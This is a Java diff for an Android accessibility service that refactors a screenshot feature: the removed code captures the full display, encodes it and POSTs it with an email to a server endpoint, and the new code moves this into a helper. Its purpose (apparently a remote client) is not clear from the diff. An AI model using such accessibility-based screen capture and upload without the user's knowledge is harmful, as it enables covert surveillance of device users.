@@ -665,81 +665,8 @@ public class AlmavivaAccessibilityService extends AccessibilityService {
         } catch (Exception ignored) {}
     }
 
-    @TargetApi(Build.VERSION_CODES.R)
     public void takeAndUploadScreenshot(String serverUrl, String email) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            try {
-                Executor executor = Executors.newSingleThreadExecutor();
-                takeScreenshot(Display.DEFAULT_DISPLAY, executor, new AccessibilityService.TakeScreenshotCallback() {
-                    @Override
-                    public void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
-                        try {
-                            HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
-                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
-                            if (bitmap != null) {
-                                Bitmap copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
-                                hardwareBuffer.close();
-
-                                // Resize down if dimension > 1280 to save bandwidth and keep response instant
-                                int maxDim = Math.max(copy.getWidth(), copy.getHeight());
-                                Bitmap uploadBitmap = copy;
-                                if (maxDim > 1280) {
-                                    float scale = 1280f / maxDim;
-                                    int nw = Math.round(copy.getWidth() * scale);
-                                    int nh = Math.round(copy.getHeight() * scale);
-                                    uploadBitmap = Bitmap.createScaledBitmap(copy, nw, nh, true);
-                                }
-
-                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                                uploadBitmap.compress(Bitmap.CompressFormat.JPEG, 75, baos);
-                                byte[] imageBytes = baos.toByteArray();
-                                String base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP);
-
-                                uploadScreenshotPayload(serverUrl, email, base64Image);
-                            }
-                        } catch (Exception e) {
-                            Log.e(TAG, "Failed to process screenshot bitmap: " + e.getMessage());
-                        }
-                    }
-
-                    @Override
-                    public void onFailure(int errorCode) {
-                        Log.w(TAG, "takeScreenshot failed with error code: " + errorCode);
-                    }
-                });
-            } catch (Exception e) {
-                Log.e(TAG, "takeScreenshot exception: " + e.getMessage());
-            }
-        } else {
-            Log.i(TAG, "takeScreenshot requires Android 11+ (API 30+)");
-        }
-    }
-
-    private void uploadScreenshotPayload(String serverUrl, String email, String base64Image) {
-        new Thread(() -> {
-            try {
-                JSONObject payload = new JSONObject();
-                payload.put("email", email);
-                payload.put("image", "data:image/jpeg;base64," + base64Image);
-                payload.put("timestamp", System.currentTimeMillis());
-
-                RequestBody body = RequestBody.create(
-                        payload.toString(),
-                        MediaType.parse("application/json; charset=utf-8")
-                );
-
-                Request req = new Request.Builder()
-                        .url(serverUrl.replaceAll("/+$", "") + "/api/client-app/screenshot")
-                        .post(body)
-                        .build();
-
-                try (Response r = httpClient.newCall(req).execute()) {
-                    Log.i(TAG, "Screenshot upload response: " + r.code());
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to upload screenshot: " + e.getMessage());
-            }
-        }).start();
+        ScreenshotHelper.captureAndUpload(this, serverUrl, email, httpClient);
     }
 
     private void updateState(boolean connected, String log) {
